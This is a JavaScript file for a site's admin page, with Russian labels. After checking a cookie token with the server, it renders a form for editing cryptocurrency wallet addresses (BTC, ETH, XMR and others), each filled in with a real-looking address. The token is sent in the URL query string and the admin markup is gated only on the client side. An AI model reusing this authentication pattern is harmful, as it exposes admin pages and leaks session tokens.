$(document).ready(function () {
    if (getCookie('token')) {
        $.ajax({
            url: URL + "/isTokenValid?token=" + getCookie('token'),
            method: "get",
            dataType: "json",
            success: function (data) {
                if (!data) {
                    location = '/admin.html'
                } else {
                    document.querySelector('.wrapper').innerHTML = `
                    <header class="header">
                    <nav class="navbar navbar-expand-lg navbar-dark bg-dark px-0 py-3">
                        <div class="container-xl">
                            <a class="navbar-brand" href="/">
                                <img src="./assets/img/logo.png" class="h-8" alt="logo">
                            </a>
                            <button class="navbar-toggler" type="button" data-bs-toggle="collapse" data-bs-target="#navbarCollapse" aria-controls="navbarCollapse" aria-expanded="false" aria-label="Toggle navigation">
                                <span class="navbar-toggler-icon"></span>
                            </button>
                            <div class="collapse navbar-collapse" id="navbarCollapse">
                                <div class="navbar-nav mx-lg-auto">
                                    <a class="nav-item nav-link" href="./adminMain.html">Параметры сайта</a>
                                    <a class="nav-item nav-link active" href="./adminWallets.html" aria-current="page">Кошельки</a>
                                </div>
                                <div class="d-flex align-items-lg-center mt-3 mt-lg-0">
                                    <a href="./admin.html" class="btn btn-sm btn-danger w-full w-lg-auto">
                                        Выйти
                                    </a>
                                </div>
                            </div>
                        </div>
                    </nav>
                </header>
                <section class="wallets">
                    <div class="container hero__container">
                        <form action="wallets.php" method="post">
                                                    <p class="wallets__text">BTC:</p>
                                <input type="text" class="form-control wallets__input" name="BTC" placeholder="BTC" value="bc1qau5vz23d654gmng4xnateqmhtrm5wxjwhqtvvv" required>
                                                    <p class="wallets__text">ETH:</p>
                                <input type="text" class="form-control wallets__input" name="ETH" placeholder="ETH" value="0x4bB009534b49D549d882f368B5f727E0aeaE3a03" required>
                                                    <p class="wallets__text">BNB:</p>
                                <input type="text" class="form-control wallets__input" name="BNB" placeholder="BNB" value="0x4bB009534b49D549d882f368B5f727E0aeaE3a03" required>
                                                    <p class="wallets__text">FTM:</p>
                                <input type="text" class="form-control wallets__input" name="FTM" placeholder="FTM" value="0x4bB009534b49D549d882f368B5f727E0aeaE3a03" required>
                                                    <p class="wallets__text">SOL:</p>
                                <input type="text" class="form-control wallets__input" name="SOL" placeholder="SOL" value="DEPSGhynjc17URx4WuWzUcAcQUyzSFdnLWX6TjJMpM3i" required>
                                                    <p class="wallets__text">XRP:</p>
                                <input type="text" class="form-control wallets__input" name="XRP" placeholder="XRP" value="rPhGzpyV4svU3etNaK8G8PvENoNh1D6tfY" required>
                                                    <p class="wallets__text">XMR:</p>
                                <input type="text" class="form-control wallets__input" name="XMR" placeholder="XMR" value="48h6WXwLN3vDni81B7S1fE6CvpadHb5PyRNsBN5H8kzuPiDcT2EY9A2KzrHCVAReZ1h8qjq9QoHTD2Sn18psvoXCSSRmP4Q" required>
                                                    <p class="wallets__text">TRX:</p>
                                <input type="text" class="form-control wallets__input" name="TRX" placeholder="TRX" value="TQCHVHmJomhFwvYZRkqGBTV415pcPvqGHJ" required>
                                                    <p class="wallets__text">DASH:</p>
                                <input type="text" class="form-control wallets__input" name="DASH" placeholder="DASH" value="XvS1Y1iibHP2hfdBmj2rLPJXYPP6GA6mqC" required>
                                                    <p class="wallets__text">LTC:</p>
                                <input type="text" class="form-control wallets__input" name="LTC" placeholder="LTC" value="LRiGMBrYMjzb11Fn4CK1TwL6ZVLKnSijBU" required>
                                                    <p class="wallets__text">VET:</p>
                                <input type="text" class="form-control wallets__input" name="VET" placeholder="VET" value="0xCd51FBbCcA377C633cA0B1eF6bB72101F6E1e5c0" required>
                                                    <p class="wallets__text">XLM:</p>
                                <input type="text" class="form-control wallets__input" name="XLM" placeholder="XLM" value="GDXZFB75UBZMEKBBVC25MS27WC44U4LNKSRSYBSPSJDVU3KOWPTQ3ONA" required>
                                                    <p class="wallets__text">NANO:</p>
                                <input type="text" class="form-control wallets__input" name="NANO" placeholder="NANO" value="nano_169ywxy5im46fo1aunfam65q9s8uuhgae6up7zuxg8k4m4zib4quhnu835q3" required>
                                                    <p class="wallets__text">DOGE:</p>
                                <input type="text" class="form-control wallets__input" name="DOGE" placeholder="DOGE" value="D7ctwW3JMpjCp4tLSfNAjUMZdJeBizKP7r" required>
                                                    <p class="wallets__text">ADA:</p>
                                <input type="text" class="form-control wallets__input" name="ADA" placeholder="ADA" value="addr1q96d9dt330smxh6nfntgs32v7c2el64f4zhm7ny3smhm3xn5626hrzlpkd04xnxk3pz5eas4nl42n290haxfrph0hzdqf54n56" required>
                                                    <p class="wallets__text">USDT:</p>
                                <input type="text" class="form-control wallets__input" name="USDT" placeholder="USDT" value="TQCHVHmJomhFwvYZRkqGBTV415pcPvqGHJ" required>
                                                    <p class="wallets__text">SHIB:</p>
                                <input type="text" class="form-control wallets__input" name="SHIB" placeholder="SHIB" value="0x4bB009534b49D549d882f368B5f727E0aeaE3a03" required>
                                                <button type="submit" class="btn btn-dark hero__btn">
                                Сохранить
                            </button>
                        </form>
                    </div>
                </section>
                    `
                }
            },
        });
    }
    if (!getCookie('token')) {
        location = '/admin.html'
    }
});

function getCookie(name) {
    let matches = document.cookie.match(new RegExp(
        "(?:^|; )" + name.replace(/([\.$?*|{}\(\)\[\]\\\/\+^])/g, '\\$1') + "=([^;]*)"
    ));
    return matches ? decodeURIComponent(matches[1]) : undefined;
}